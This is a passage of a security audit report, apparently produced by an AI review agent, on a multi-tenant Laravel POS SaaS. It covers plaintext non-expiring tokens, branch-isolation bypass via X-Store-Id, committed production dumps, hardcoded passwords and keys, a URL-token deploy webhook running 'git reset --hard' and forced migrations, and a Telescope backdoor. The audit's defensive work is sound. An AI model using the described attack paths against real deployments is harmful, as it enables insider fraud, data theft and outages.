**Seeder.** DatabaseSeeder.php:20-41 creates two central users, each holding both the 'super_admin' and 'admin' roles. Both password values are hardcoded literals. The comments on lines 20 and 31 also repeat the default passwords in plain text, and both values are trivially weak. Secret type: hardcoded default admin passwords. Values not reproduced.

**Mitigating notes.** None of these change the verdict.
- The token fallback needs a tenant user with the same phone to already exist. The login fallback creates one, so this is only a small precondition.
- The fallback looks like an intentional support backdoor, not an accident.
- Exploiting it requires a central admin credential. The tracked seeder makes that credential predictable if it was never rotated.

**Rule conflict.** This contradicts multi-tenancy rule 3: a token that does not belong to the selected tenant's DB is accepted, and it leaves persistent privileged state behind. High severity is justified.

### 16. [HIGH] Bearer tokens never expire and are also stored in plaintext in users.api_token, which is accepted as a credential (also via ?api_token= in the URL)
- **Location:** `D:\projects\sroor\backend\app\Http\Middleware\ApiTokenAuth.php:21`
- **Effort:** M
- **Evidence:** Line 21 reads the token from bearerToken() ?: header X-API-TOKEN ?: query('api_token'). Lines 43-48 do User::where('api_token', $token): a plaintext DB comparison, not constant-time. ApiLoginAction.php:85-90 and ApiQuickLoginAction.php:55-60 write the full plaintext 'id|secret' token into users.api_token. The custom middleware replaces Sanctum's guard and never checks expires_at or sanctum.expiration (config/sanctum.php is absent; the vendor default is 'expiration' => null). createToken() passes no expiry. Logout (ApiLogoutAction.php:22-29) deletes the current token and clears api_token, which is correct. But tokens issued to other devices live forever, and a password change does not revoke tokens. routes/web.php:28 and TelescopeServiceProvider.php:69 also accept api_token plaintext matches.
- **Impact:** Anyone with read access to a tenant DB dump gets working admin tokens without cracking anything. That includes the tracked backups/ folder, Hostinger DB backups, and support staff. A token passed as ?api_token= or in /telescope-access?token= ends up in access logs, proxy logs and Telescope entries. A stolen phone or a fired cashier keeps API access indefinitely unless an admin deactivates the account.
- **Recommendation:** Drop the api_token column fallback (and column), stop accepting tokens in query strings, and use Sanctum's guard (auth:sanctum), which enforces expiration. Set sanctum expiration (e.g. 30 days, sliding) and pass expires_at to createToken. Revoke all tokens on password change and on deactivation.
- **Verification:** I confirmed this in the code. It is wired into the live API: routes/api.php:33 wraps every protected /api/v1 endpoint in ApiTokenAuth::class, and that middleware replaces auth:sanctum.

1. **Token sources.** ApiTokenAuth.php:21 takes the token from bearerToken(), then the X-API-TOKEN header, then query('api_token'). So a token passed in the URL is accepted.
2. **No expiry check.** Lines 33-41 call PersonalAccessToken::findToken() and check only is_active. They never check expires_at or a sanctum expiration setting. There is no config/sanctum.php (ls config shows none), and grepping app/ and config/ for 'expiration' or 'expires_at' finds nothing relevant to tokens.
3. **Plaintext fallback.** Lines 44-47 fall back to User::where('api_token', $token), a plaintext column match. Lines 51-62 repeat both lookups against the central DB while in tenant context. If the central user is an admin, the request is authenticated as the tenant user with the same phone number.
4. **Plaintext storage.** ApiLoginAction.php:83-90 and ApiQuickLoginAction.php:53-60 call createToken($name, ['*']) with no expiry argument and write the full plainTextToken ('id|secret') to users.api_token. The column is created as string(80) unique nullable in both the central and tenant migrations 2026_08_15_160000.
5. **Revocation.** The only place in app/ that calls tokens() is ApiLogoutAction.php:25, which is an elseif fallback. Normal logout deletes only the current token. Nothing in UpdateUserAction, UpdateProfileAction or the password flows revokes tokens, so other devices keep working until the account is deactivated.
6. **Telescope paths.** routes/web.php:28 (/telescope-access?token=) and TelescopeServiceProvider.php:69 also accept a plaintext api_token match from the query string. A match logs the user in to the web guard with remember=true.

Two parts of the claim are weaker than stated:
- The non-constant-time comparison is a minor issue, because the lookup goes through a DB index.
- The api_token column holds only the most recent login's token. Older device tokens live in personal_access_tokens, where Sanctum stores only a hash, so a DB dump does not yield them. They still never expire.

On the backups/ folder: backups/sroor_backup_20260831_151852.sql exists on disk, but `git ls-files backups` listed only CSV, HTML and PHP files in the output I saw. I could not confirm the SQL file is tracked or that it contains api_token values, because my grep of it was denied.

Even so, the core claim stands. Anyone who can read a DB copy gets a ready-to-use bearer token from api_token, and tokens never expire or get revoked on a password change. High severity is justified.

### 17. [HIGH] Suspended or expired tenants keep full API access, because suspension is only reported by the workspace resolver
- **Location:** `D:\projects\sroor\backend\app\Http\Middleware\ResolveApiTenancy.php:33`
- **Effort:** S
- **Evidence:** ResolveApiTenancy initializes any Tenant found by id or domain without checking status or subscription_ends_at. Only ResolveTenantWorkspaceAction.php:46-57 and ToggleTenantStatusRequest reference 'suspended'. No middleware in app/Http/Middleware enforces Tenant::isSuspended()/isActive().
- **Impact:** A tenant suspended for non-payment, or whose trial ended, keeps using the app. The client only needs to skip the resolver call and send X-Tenant: <slug> (or use the subdomain) on every request. For a SaaS sold by subscription, this bypasses billing.
- **Recommendation:** After initialization in ResolveApiTenancy (and on the domain-identified tenant routes), return 402/403 with __('auth.workspace_suspended') when tenant()->isSuspended() or the trial has expired. Allow-list only /auth/me and logout, so the UI can show the message.
- **Verification:** The finding holds. No server-side code blocks a suspended or expired tenant.

1. **The API middleware does not check status.** `ResolveApiTenancy.php` lines 30-37 and 57-68 look up the Tenant by `X-Tenant`, by the `tenant` param, or by host, then call `tenancy()->initialize($tenant)`. They never read `status`, `subscription_ends_at` or `trial_ends_at`.

2. **No other API middleware checks it either.** `routes/api.php:19` applies only `ResolveApiTenancy`, and line 33 adds `ApiTokenAuth`. `ApiTokenAuth.php` checks only the user's `is_active` (lines 36, 46, 57, 61).

3. **Nothing is registered globally.** `bootstrap/app.php` appends only `StoreScope` to `web` and registers spatie and store aliases.

4. **No event listener checks it.** In `TenancyServiceProvider.php`, `InitializingTenancy` has no listeners. `TenancyInitialized` has only `BootstrapTenancy`.

5. **The web routes don't check it.** `routes/tenant.php` lines 20-24 use only stancl's `InitializeTenancyByDomain` and `PreventAccessFromCentralDomains`, so the session-based SPA routes are also unguarded.

6. **Login doesn't check it.** `ApiLoginAction` (line 77) checks only `$user->is_active`, so a user of a suspended tenant can still log in and get a fresh token.

7. **The suspension helpers are never called.** `Tenant::isSuspended()` (`Tenant.php` 176-179), which also treats a past `subscription_ends_at` as suspended, and `Tenant::isActive()` (166-171) have no caller except `ResolveTenantWorkspaceAction.php:48`. That action backs the pre-login lookup at `GET /api/v1/central/tenants/resolve` and only returns a 403 payload; it gates nothing afterwards.

8. **The flag exists only in the UI and tests.** A repo-wide grep finds 'suspended' only in admin UI labels, analytics counts, the `ToggleTenantStatusRequest` validation rule and tests. No test asserts that a suspended tenant is denied on a tenant API route.

**Impact:** a super-admin suspension, or the end of a trial or subscription, has no effect on the API or web app. Existing tokens keep working, and new logins still succeed with `X-Tenant` or the tenant subdomain.

**Why not lower:** this is not a cross-tenant breach. The people bypassing it are the tenant's own valid users. But for a SaaS sold by subscription, all suspension and billing enforcement is missing, so high is reasonable.

### 18. [HIGH] Dashboard returns profit, margin, debts and cash for any branch to any authenticated user
- **Location:** `D:\projects\sroor\backend\app\Http\Controllers\Api\DashboardApiController.php:29`
- **Effort:** S
- **Evidence:** GET /api/v1/dashboard and /dashboard/summary (api.php:45-46) have no `can:` middleware. DashboardApiController::index has no permission check, and the store comes from `$request->header('X-Store-Id') ?: $request->input('store_id')`. GetDashboardOverviewAction.php:37 accepts any active store id without checking whether the user may access it. The response includes monthly_gross_profit, monthly_margin, customers_debt, suppliers_debt, net_cash_today and recent_invoices (lines 220-245).
- **Impact:** A cashier assigned to branch 1 calls GET /api/v1/dashboard?store_id=2 (or with X-Store-Id: 2) and reads branch 2's gross profit, margin, debts and today's invoices. That is information the RBAC matrix reserves for reports.view and admin roles. For a reseller SaaS this breaks the promise that staff only see their own branch and never see profits.
- **Recommendation:** Restrict financial blocks to users with reports.view, and drop or zero profit and debt fields for other roles. Resolve the store through StoreAccess (assigned stores plus default store, or stores.manage) and return 403 otherwise. Add tests for a cashier requesting another store and for a cashier receiving no profit fields.
- **Verification:** I confirmed this from the code. I found no guard anywhere in the request path.

**The route has no permission or store guard.** In `backend/routes/api.php:45-46`, both routes sit only behind `ResolveApiTenancy` and `ApiTokenAuth`. There is no `can:`, `permission:` or `store.access` middleware on them.

**The registered store middleware is not used here.**
- `bootstrap/app.php` registers `store.access` and `store.scope` as aliases, but nothing applies them to API routes. A grep for `store.access` across the app finds no use outside the alias line.
- `StoreScope` is appended only to the `web` group, not the API.
- `StoreAccess` would not catch this request anyway. It reads `store_id` from the route, the input or the session, never from the `X-Store-Id` header.

**The auth middleware trusts the header.** `ApiTokenAuth.php:83-86` copies any numeric `X-Store-Id` into `session('current_store_id')` without checking it.

**The controller and action never check access.**
- `DashboardApiController.php:22-42` checks only that `$user` is not null, then takes the store id straight from the header or the `store_id` input.
- `GetDashboardOverviewAction.php:38` loads `Store::where('id', $storeId)->where('is_active', true)`. It never checks that the user belongs to that store and makes no permission call.
- The response (lines 214-245) includes `monthly_gross_profit`, `monthly_margin`, `customers_debt`, `suppliers_debt`, `net_cash_today`, `recent_invoices` and the active shift's cash.

**The RBAC matrix reserves this data.** In `PermissionsSeeder.php`, `reports.view` is described as financial reports and profits, and it is not given to the cashier or storekeeper roles (lines 84-108). Those roles can still call `/api/v1/dashboard` with any store id and get another branch's profit and margin.

**The tests do not cover it.** The only dashboard tests (`tests/Feature/Api/DashboardApiTest.php`) use an admin token. Nothing checks that a non-admin user or a store the user is not assigned to gets a 403.

**It is somewhat worse than claimed.** Customer and supplier debt (lines 114-115), customer payments (line 90) and supplier payments (line 104) ignore the store filter entirely. So even with no `store_id`, any authenticated user gets tenant-wide debt totals and payments from every branch.

**Why I kept the severity at high.** The leak stays inside one tenant, since the token must belong to a user in that tenant's database. It is not cross-tenant. But it breaks the documented store-isolation rule ("user without access to a store must get 403") and the profit-visibility rule, and any low-privilege staff member can exploit it with a single request.

### 19. [HIGH] No server-side store isolation: client-controlled X-Store-Id/store_id is trusted by every operational API endpoint
- **Location:** `D:\projects\sroor\backend\app\Http\Middleware\ApiTokenAuth.php:83`
- **Effort:** L
- **Evidence:** ApiTokenAuth.php:83-86 writes the X-Store-Id header into session('current_store_id') with no membership check. Every controller then reads `$request->header('X-Store-Id') ?: $request->input('store_id') ?: getCurrentStore()`. This happens in InvoiceController:40 and :143, ShiftController:41/77/106/130, ExpenseController:48/139, PurchaseController:45/127, ReturnController:41/120, ItemController:53/274, TreasuryController:34, DashboardApiController:29, DailyJournalController:25 and ReportController:37. User::getCurrentStore() (User.php:77-81) trusts the session store if it is active. StoreAccess middleware (the only membership check) is aliased in bootstrap/app.php:28 but no route uses it; route:list shows only `api, ResolveApiTenancy, ApiTokenAuth`. No model has a store global scope; app/Models/Scopes does not exist. The only correct membership check is StoreController::switchStore (lines 225-238), and the header bypasses it.
- **Impact:** A cashier assigned only to store 1 (pos.access) sends X-Store-Id: 2 on: (a) POST /api/v1/invoices or /pos/checkout, which sells and deducts stock from store 2; (b) POST /api/v1/shifts/open and /shifts/close, which opens or closes store 2's cash shift; (c) POST /api/v1/expenses, which books an expense against store 2's drawer; (d) GET /api/v1/treasury/summary, /dashboard and /daily-journal, which read store 2's cash position. InvoiceController::index (line 40) also returns all stores' invoices when store_id is omitted. Branch-level segregation, a core selling point for multi-branch tenants, is not enforced.
- **Recommendation:** Create a single StoreContext resolver, used as middleware on the whole tenant API group. It validates the requested store against `$user->stores()` or default_store_id, or an explicit `stores.all` permission, and aborts with 403 otherwise. It then exposes the resolved id via a request attribute so controllers stop reading the header directly. Add a BelongsToStore global scope (or explicit policy checks) for Invoice, Purchase, ReturnDocument, Expense, CashShift, Payment and StockMovement. Add feature tests asserting 403 for a foreign X-Store-Id.
- **Verification:** The finding holds up against the code. I read each part myself:
(1) ApiTokenAuth.php:82-86 copies a numeric X-Store-Id header into session('current_store_id') and never checks that the user belongs to that store.
(2) StoreAccess, the only middleware that checks membership through user->stores() and default_store_id, is aliased as 'store.access' in bootstrap/app.php:28. A grep of routes/ and bootstrap/ finds no route that uses it. The protected group in routes/api.php is only ResolveApiTenancy + ApiTokenAuth. StoreScope is appended only to the web group, and it only checks that the store exists and is active, not membership.
(3) Controllers take the client value directly. InvoiceController::store (lines 143-146), ShiftController::open/current/close (lines 77/106/130), ExpenseController:139, PosController:99 and TreasuryController:34 all use header ?: input('store_id') ?: getCurrentStore().
(4) The form requests do not check the store either. StoreSalesInvoiceRequest::authorize checks only the invoices.create / pos.access permissions, and OpenShiftRequest checks only daily_journal.view / pos.sell. Neither validates store_id against the user's stores.
(5) No Action, Service or DTO checks membership. A grep for stores()/default_store_id in app/Actions and app/Services finds only login/context listing and user CRUD.
(6) User::getCurrentStore() trusts any active store id held in the session.
(7) InvoiceController::index (lines 40-58) applies no store filter when store_id is missing or 'all'.
So a cashier assigned to one branch can sell from, open or close shifts on, book expenses against, and read the treasury of any other branch in the same tenant.

Why it stays high and not critical:
- Isolation between tenants is not affected, because tenancy is DB-per-tenant.
- The attacker must be an authenticated employee of the same tenant who already holds pos/invoice permissions.
- It is still a real break in branch-level authorization, and it hits stock and cash integrity directly.

### 20. [HIGH] Production MySQL dumps with full business data committed to git (users, customers, invoices, payments, settings, telescope_entries)
- **Location:** `D:/projects/sroor/backups/sroor_backup_latest.sql`
- **Effort:** S
- **Evidence:** These files are tracked by git ls-files: backups/sroor_backup_20260831_151852.sql (7.8 MB), backups/sroor_backup_20260831_151852.sql.gz, backups/sroor_backup_latest.sql (7.8 MB), backups/sroor_prod_2026-09-29.sql.gz and backups/sroor_prod_copy_before_recost_2026-09-29.sql.gz (2.9 MB each). The plain .sql contains INSERT INTO for users, customers, suppliers, invoices, payments, expenses, settings, activity_logs, audit_logs, telescope_entries and pulse_entries. A Telegram-bot-token-shaped string pattern matches inside both plain .sql dumps (value not printed). Also tracked: cost audit CSV/HTML/PDF reports and screenshots. All were added in commit 76f32ce0 ('WIP: epitaxy pre-switch'), which no remote branch contains yet. .gitignore does not ignore backups/*.sql.
- **Impact:** Pushing this branch, or the repo being cloned or shared, exposes the real shop's customer PII (names and phones), debts, sales and cost data, password hashes, and a live Telegram bot token. The users table also stores api_token in plaintext (ApiQuickLoginAction writes the full plainTextToken into users.api_token, and ApiTokenAuth:43-47 accepts it), so the dump may contain working bearer tokens.
- **Recommendation:** Before any push, drop commit 76f32ce0's backups/ content from history (git rm --cached plus amend/rebase of the unpushed commit; use git filter-repo if it has spread). Add `backups/`, `*.sql`, `*.sql.gz` to .gitignore. Rotate the Telegram bot token via BotFather. Invalidate all users.api_token values and personal_access_tokens on production. Keep backups in encrypted off-repo storage.
- **Verification:** The core of the finding is real. Lowered from critical to high because the data has not left the machine yet.

Confirmed:
- `git ls-tree -l 76f32ce0 backups/` lists five dumps.
  - `sroor_backup_latest.sql` and `sroor_backup_20260831_151852.sql` are the same file (blob 82089fd8, 7,786,814 bytes).
  - The `.sql.gz` copy of that dump is 907,705 bytes.
  - `sroor_prod_2026-09-29.sql.gz` is 2,941,193 bytes and `sroor_prod_copy_before_recost_2026-09-29.sql.gz` is 2,941,002 bytes.
  - Also tracked under `backups/`: the cost-audit CSVs, `cost_correction_report_2026-09-29.html`, a `cost_fix_proposed` folder with `opening_costs.json`, and a folder of screenshots plus a PDF report.
- All of these came in with WIP commit 76f32ce0 (the commit touches 12 paths under `backups/`).
- `git check-ignore` returns nothing for these files, and `.gitignore` only covers `*.sqlite`, `.env.backup` and similar. Nothing ignores `backups/` or `*.sql`.
- The extra point about `api_token` also holds:
  - `backend/app/Actions/Auth/ApiQuickLoginAction.php:55-59` (and `ApiLoginAction.php:89`) save the full Sanctum `plainTextToken` into `users.api_token`.
  - `backend/app/Http/Middleware/ApiTokenAuth.php:43-57` accepts a direct lookup on that column (`User::where('api_token', $token)`), and so does `TelescopeServiceProvider.php:69`.
  - So any dump of the `users` table could hold working bearer tokens.

Not verified:
- I could not read the dump contents. The permission system blocked reads of `backups/` and of `sroor_backup_latest.sql`, so I can't confirm the `INSERT INTO` table list or the Telegram-token-shaped string.
- The file names (`sroor_prod_*`) and sizes strongly suggest real production data, but the specific tables and the Telegram token are unconfirmed.

Why high, not critical:
- `git status -sb` shows `feature/multi-tenant...origin/feature/multi-tenant [ahead 1]`, and `git branch -r --contains 76f32ce0` returns nothing. The commit is local only and not on any remote yet.
- The risk is that it gets pushed or the repo is shared, and the dumps then stay in history. That needs fixing before any push, and if any of these files was ever pushed elsewhere, the credentials and tokens need rotating.

### 21. [HIGH] Production DB passwords and production APP_KEYs hard-coded in tracked scripts; one APP_KEY reused in phpunit.xml
- **Location:** `D:/projects/sroor/deploy_root_baraa.py:99`
- **Effort:** M
- **Evidence:** DB_PASS literal (redacted) at restore_sroor_db.py:11, backup_sroor_db.py:11 (plus password= at :20/:34). DB_PASSWORD (redacted) at deploy_root_baraa.py:99. A base64 APP_KEY (redacted) at deploy_root_baraa.py:85, and a second APP_KEY at deploy_to_sroor_subdomain.py:54, deploy_with_mysql.py:42 and fix_shipping_php83.py:28. Hash comparison shows the same value as backend/phpunit.xml:22. These scripts write a production .env with APP_ENV/APP_DEBUG=false. .env.e2e:3 has a different APP_KEY (test only).
- **Impact:** If either key is or was the production APP_KEY, an attacker can forge encrypted cookies and sessions, decrypt any encrypt()ed data (e.g. tenant DB config, settings), and forge signed URLs. With the DB password and SSH access, every tenant DB can be dumped.
- **Recommendation:** Rotate the MySQL user passwords and generate a new production APP_KEY (plan the re-encryption of encrypted columns and session invalidation). Generate the phpunit key separately and never reuse a key that has been in a deploy script. Remove from tracked files and purge from history together with the SSH password.
- **Verification:** The finding holds, and it is slightly understated. I checked each claim in the code. No values are reproduced here.

**Files are in git.** `git ls-files` shows all six scripts are tracked: deploy_root_baraa.py, restore_sroor_db.py, backup_sroor_db.py, deploy_to_sroor_subdomain.py, deploy_with_mysql.py and fix_shipping_php83.py. backend/phpunit.xml and .env.e2e are also tracked.

**Database passwords.**
- restore_sroor_db.py:11 and backup_sroor_db.py:11 set `DB_PASS` to a literal.
- That value is used in a mysql command at restore_sroor_db.py:20 and a mysqldump command at backup_sroor_db.py:34, both run on the server over SSH.
- deploy_root_baraa.py:99 sets `DB_PASSWORD` for `DB_DATABASE=[HOSTING_ACCOUNT]_baraa_central`.
- deploy_to_sroor_subdomain.py:70, deploy_with_mysql.py:58 and fix_shipping_php83.py:44 set `DB_PASSWORD` literals for `[HOSTING_ACCOUNT]`.

**APP_KEYs.**
- A base64 APP_KEY is at deploy_root_baraa.py:85.
- A second base64 APP_KEY is at deploy_to_sroor_subdomain.py:54, deploy_with_mysql.py:42 and fix_shipping_php83.py:28.
- Comparing SHA-256 hashes, that second key is the same as backend/phpunit.xml:22 (hash prefix 0f3faf116b3f).
- The deploy_root_baraa.py key is a different value.
- Each of these blocks writes a .env with `APP_ENV=production` and `APP_DEBUG=false` (for example deploy_root_baraa.py:84-86). So both keys are very likely live or former production keys.

**Missed by the original finding: SSH passwords.** The scripts also hold the hosting SSH password as a literal:
- deploy_root_baraa.py:12 (`PASS`), restore_sroor_db.py:7 and backup_sroor_db.py:7.
- It is passed to `paramiko ssh.connect(..., password=...)` at deploy_root_baraa.py:47, restore_sroor_db.py:17 and backup_sroor_db.py:27. The other three scripts pass a password the same way at line 23 or 13.
- Connections use `AutoAddPolicy`, so host keys are not checked.
- With SSH access, an attacker could also read the live .env and dump every tenant database directly. This makes the DB password and APP_KEY nearly redundant as attack steps.

**Nothing in the code reduces the risk.** No env var, secret store or .gitignore covers these files. The secrets are in history, most recently in commit 76f32ce0.

**Why high and not critical:** actual exposure depends on who can see the git remote, and I could not confirm that read-only. If the repo has ever been shared or public, treat this as critical: rotate the SSH password, the DB passwords and both APP_KEYs, and purge them from git history.

### 22. [HIGH] Deploy webhook: static shared secret in query string, committed in two places, no replay protection, runs git reset --hard + migrate --force
- **Location:** `D:/projects/sroor/update_webhook.php:4`
- **Effort:** M
- **Evidence:** update_webhook.php:4 hard-codes $secretToken (redacted), and line 6 compares it with `!==` (not hash_equals) against $_GET['token'] or $_POST['token']. On match it runs `git fetch --all`, `git reset --hard origin/main`, `php artisan migrate --force` and `optimize:clear` (lines 32-37), and returns the full command output in JSON (line 44). .github/workflows/deploy.yml:49 embeds the same token in plaintext in the curl URL (not a GitHub secret). read_webhook.py shows the file lives in public_html of the production domain, so it is web-reachable. There is no HMAC of a GitHub payload, no timestamp/nonce, no IP allow-list and no rate limit.
- **Impact:** Anyone with repo read access, or any proxy/access log that captured the URL, can trigger production deploys and migrations at will. Repeated calls can run a half-reviewed main or a destructive migration on the central DB mid-business-day, and the response leaks git/migration output and server paths. It is not RCE by itself (the commands are fixed), but it gives control over when production changes.
- **Recommendation:** Rotate the token. Store it only in server env and a GitHub Actions secret. Verify an HMAC-SHA256 signature over the body with a timestamp (reject if older than 5 minutes), compare with hash_equals, accept POST only, and return a minimal response. Better: deploy over SSH from Actions using a deploy key, and run migrations as an explicit step. Also note the workflow's `|| echo "Deployment triggered successfully."` masks failures, and its test job runs `composer update` at the repo root where there is no composer.json (the app is in backend/), so CI is likely broken or not gating.
- **Verification:** I confirmed this from the code. D:/projects/sroor/update_webhook.php:4 hard-codes a 33-character static deploy token (value not reproduced). Line 6 checks it with a plain `!==` against $_GET['token'] or $_POST['token'], not hash_equals. On a match, lines 32-37 run `git fetch --all`, `git reset --hard origin/main`, `artisan migrate --force` and `artisan optimize:clear`. Line 44 returns the full $output array as JSON, which includes git and migration output and server paths. There is no HMAC signature check, timestamp, nonce, IP allow-list or rate limit. The token is committed in three places, not two: D:/projects/sroor/backend/public/update_webhook.php:4 is a near-identical copy (projectRoot = dirname(__DIR__)) that sits in Laravel's web-served public/ directory. D:/projects/sroor/.github/workflows/deploy.yml:49 puts the same token in plaintext in the curl query string instead of using a GitHub secret. D:/projects/sroor/read_webhook.py:14 points to the file in the production domain's public_html, so the endpoint is reachable from the web. Nothing else guards it: it is a standalone PHP script that runs outside Laravel, so no middleware or auth applies. Mitigating factors: the commands are fixed (not RCE), they only reset to origin/main (so an attacker cannot pick which code gets deployed), and exposure depends on having repo read access or seeing the URL in a log. Even so, an unauthenticated party can trigger production resets and forced migrations at will, and the endpoint leaks server details. High is the right severity.

### 23. [HIGH] Telescope bridge and gate: token in URL, plaintext api_token lookup, any 'admin' role / hard-coded phones / any @baraa-solutions.com email, then a remember-me web login
- **Location:** `D:/projects/sroor/backend/routes/web.php:17`
- **Effort:** S
- **Evidence:** web.php:17-48 reads ?token=, resolves it via PersonalAccessToken::findToken or User::where('api_token',$token) (plaintext column), allows hasRole('admin'), two hard-coded phones, or str_ends_with(email,'@baraa-solutions.com'), then calls auth('web')->login($user, true) and redirects to /telescope. TelescopeServiceProvider::gate (lines 59-87) repeats this inside viewTelescope: any request to /telescope?token=... logs the user in with remember=true and allows the 'admin' role. Gate::before (AppServiceProvider:44) also returns true for 'admin' on any non-super_admin ability, viewTelescope included. config/telescope.php:19 defaults 'enabled' to true. TELESCOPE_ENABLED is absent from .env.example. Storage connection = DB_CONNECTION.
- **Impact:** Any user with the 'admin' role in the DB that web routes resolve to (the central DB, which also holds the legacy shop's users) gets Telescope. Telescope exposes queries with bindings, exceptions, logs, mail and failed request payloads, which can include other tenants' data and secrets. The bearer token travels in the URL into server access logs, browser history and Referer headers, and the session is upgraded to a long-lived remember-me cookie. The email-suffix rule lets any account whose email can be set to *@baraa-solutions.com in that DB qualify.
- **Recommendation:** Delete /telescope-access and the token branch in the viewTelescope gate. Restrict Telescope to a central super-admin guard (central DB only) or disable it in production (TELESCOPE_ENABLED=false, or register only in local). Remove the role 'admin' / phone / email-domain allow-lists. Never accept tokens in query strings. If production monitoring is needed, put it behind an IP allow-list plus a central guard.
- **Verification:** I checked the code and the finding holds; I found no guard elsewhere that blocks it. backend/routes/web.php:17-48 reads ?token=. It resolves the token through PersonalAccessToken::findToken, then falls back to User::where('api_token',$token). The users are allowed if they have the 'admin' or 'super_admin' role, one of the hard-coded phones [REDACTED_PHONE]/[REDACTED_PHONE], or an email ending in '@baraa-solutions.com' (line 39). The route then calls auth('web')->login($user, true), which logs in with remember-me, and redirects to /telescope.

TelescopeServiceProvider::gate (lines 59-87) does the same thing inside viewTelescope. Its closure takes `$user = null`, so it also runs for guests. A ?token= on any /telescope request therefore logs the user in with remember=true. That gate allows 'admin' and the phones, but only two exact @baraa-solutions.com emails, so the suffix rule exists only in web.php. AppServiceProvider:37-45 has a Gate::before that returns true for 'admin' and for the hard-coded phones.

On configuration: bootstrap/providers.php registers both Telescope providers. config/telescope.php:19 sets 'enabled' to env('TELESCOPE_ENABLED', true), there is no TELESCOPE_ entry in .env.example, storage uses DB_CONNECTION, and the only Telescope middleware is web + Authorize. bootstrap/app.php attaches no tenancy middleware to routes/web.php, so these lookups hit the default (central) DB.

The plaintext-token claim is confirmed too. ApiLoginAction.php:82-90 and ApiQuickLoginAction.php:59 write the full Sanctum plainTextToken into users.api_token. That makes a DB read equal to bearer tokens, and the column can be used for lookup without hashing.

Caveats that reduce the impact a little but do not change the rating:
- Outside the local environment, Telescope::filter records only reportable exceptions, failed requests, failed jobs, scheduled tasks and monitored tags, not every query and request. Failed-request payloads and exceptions are still recorded.
- Telescope hides only _token, cookie and CSRF headers. Authorization headers are not masked.
- The email-suffix escalation only matters for accounts in the central DB. Tenant profile updates (UpdateProfileRequest, tenant.php:235) write to the tenant DB. However, api.php:183 also exposes PUT /profile, which may run against the central DB for legacy users.

Severity: high is justified. Long-lived token-to-session upgrade via URL, plaintext token column, and broad role/hard-coded identity allowlist on a debug panel.

### 24. [HIGH] Production deploy webhook with hardcoded secret is tracked in git and sits in the web root
- **Location:** `D:\projects\sroor\backend\public\update_webhook.php:4`
- **Effort:** S
- **Evidence:** Line 4 holds a hardcoded webhook secret (static deploy token, redacted). The token is compared with !== from $_GET['token'] or $_POST['token']. On a match the script runs exec('git fetch --all'), exec('git reset --hard origin/main') and artisan migrate --force, then returns all command output as JSON. The file is git-tracked under backend/public/, so it is served directly.
- **Impact:** Anyone with read access to the repo or its history (contractors, a leaked clone, CI logs) can call https://<host>/update_webhook.php?token=... at will. That forces a hard reset to origin/main (which differs from the deployed SaaS branch) and runs pending migrations on production. The result can be outages, schema drift and data loss for all tenants, plus leaked server paths and git output. Because the token travels in the URL, it also lands in access logs.
- **Recommendation:** Rotate or invalidate the token, then remove the file from public/ and purge it from git history. If a webhook is still needed, use a signed HMAC (X-Hub-Signature-256) checked with hash_equals, sent as POST only, with the secret in .env or GitHub secrets, IP allow-listing, and replay protection. Do not echo command output.
- **Verification:** I confirmed this from the code. backend/public/update_webhook.php is tracked in git: `git ls-files` lists it, and it was added in commit e85c1d62. Line 4 sets `$secretToken` to a hardcoded string literal, which is a static deploy webhook token (value not reproduced here). It does not come from getenv or .env. Lines 6-9 compare that token with `!==` against `$_GET['token']` and `$_POST['token']`, so the token can be sent in the query string and will show up in access logs. When the token matches, the script runs `git fetch --all` and `git reset --hard origin/main`, then `artisan migrate --force` and `optimize:clear`. It returns all command output, the PHP binary path and a timestamp as JSON. Nothing blocks it from being served. The root .htaccess rewrites every request to public/, and backend/public/.htaccess only sends requests for files that don't exist to index.php, so a real .php file like this one runs directly. No middleware, policy or Laravel guard applies, because the script never boots Laravel. The token check is the only protection. There is no rate limit, no IP allowlist and no HMAC signature, and the comparison is not constant-time. Two points in the claim are overstated: exploiting it needs the token (repo or history access, or leaked logs), and the claim that resetting to main would break the SaaS deployment depends on which branch production actually tracks. Even so, a repo-held secret that triggers a hard reset and forced migrations on production is serious. High severity stands.

### 25. [MEDIUM] Seeded granular permissions are not enforced: cashier can set any price or discount; storekeeper permissions are ignored
- **Location:** `D:\projects\sroor\backend\app\Http\Requests\StorePOSInvoiceRequest.php:83`
- **Effort:** M
- **Evidence:** PermissionsSeeder defines invoices.discount, items.view_cost, items.create/edit/delete, transfers.create and daily_journal.close_shift. A grep shows invoices.discount, items.view_cost and daily_journal.close_shift appear only in GetPermissionsTreeAction, so nothing enforces them. StorePOSInvoiceRequest accepts client `items.*.unit_price` (min:0), `items.*.discount` and `discount_amount`, and InvoiceService.php:72-73 and :379-380 use the client unit_price and discount as-is. Meanwhile controllers and FormRequests check 12 permissions that are never seeded: items.manage, users.manage, settings.manage, system.manage, returns.view, returns.create, suppliers.view, expenses.view, stores.view, purchases.manage, reports.advanced and pos.sell. Examples: StoreItemRequest needs items.manage; StoreStockTransferRequest uses stores.view; StoreAppVersionRequest uses system.manage.
- **Impact:** (a) Insider fraud: a cashier without invoices.discount posts /api/v1/pos/checkout with unit_price 0.001 or a discount_amount equal to the total and the server accepts it. The 'discount' permission an owner configures in the roles screen does nothing. (b) The RBAC screen lies: the storekeeper role (items.create/edit) cannot create items through the API because the code requires items.manage, and transfers.create does not allow transfers. Owners will 'fix' this by granting admin, which widens access.
- **Recommendation:** Make one permission catalogue the single source of truth, e.g. an enum used by the seeder, the requests and the SPA, and add a test that every permission referenced in app/ exists in the seeder. Enforce invoices.discount (reject non-zero discounts without it) and either re-price lines from the item price tier server-side or require a permission for price overrides. Enforce items.view_cost in resources.
- **Verification:** The finding is mostly real, but one of its attack paths is wrong.

Confirmed:
(1) Three seeded permissions are never checked anywhere: `invoices.discount`, `items.view_cost` and `daily_journal.close_shift`. In backend code they appear only in PermissionsSeeder.php and GetPermissionsTreeAction.php, and no policy, gate or middleware checks them. `Gate::before` in AppServiceProvider.php:37-45 only short-circuits for super_admin, admin and two hardcoded phone numbers. Those phone numbers are a separate backdoor issue.
(2) The price is taken from the client. StorePOSInvoiceRequest.php:83 accepts `items.*.unit_price` with only `min:0`. POSInvoiceItemDTO passes it through, and InvoiceService::confirmInvoice (lines ~72-73) uses it as-is with no comparison to the item's stored price. Any cashier (`pos.access` or `invoices.create`) can sell at 0 or 0.001.
